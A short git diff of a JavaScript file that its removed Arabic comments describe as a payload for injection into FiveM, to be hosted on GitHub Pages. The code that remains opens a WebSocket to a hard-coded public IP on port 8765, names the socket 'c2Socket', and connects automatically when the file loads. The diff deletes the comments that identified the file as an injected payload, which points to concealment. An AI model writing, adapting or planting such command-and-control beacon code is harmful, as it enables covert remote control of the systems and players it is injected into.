@@ -1,13 +1,5 @@
-// =========================================================
-// **ملف: payload.js** - (للحقن في FiveM)
-// يجب رفع هذا الملف على GitHub Pages
-// =========================================================
 
-// **1. قم بتعديل هذا السطر:** استخدم IP العام الخاص بك مع المنفذ 8765
-// const WS_SERVER_URL = "ws://146.251.25.235:8765"; 
-// const WS_SERVER_URL = "ws://127.0.0.1:8765";
 const WS_SERVER_URL = "ws://146.251.25.235:8765";
-// 2. دالة بدء الاتصال
 const startConnection = () => {
   // يمنع فتح اتصالات متعددة بالخطأ
   if (globalThis.c2Socket && globalThis.c2Socket.readyState === WebSocket.OPEN) {
@@ -53,5 +45,6 @@ const startConnection = () => {
 
 // ابدأ عملية الاتصال فور تحميل الملف
 startConnection();
+
 
 
